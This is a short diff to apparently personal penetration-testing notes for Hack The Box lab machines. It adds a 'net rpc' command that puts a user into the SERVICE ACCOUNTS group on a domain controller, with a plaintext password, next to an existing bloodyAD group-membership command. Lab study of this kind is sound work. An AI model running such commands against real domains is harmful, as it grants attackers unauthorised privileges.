@@ -3,6 +3,10 @@ adding user to a group:
 bloodyAD --host puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
 ```
 
+```
+`net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"`
+```
+
 check user in group:
 
 ```bash
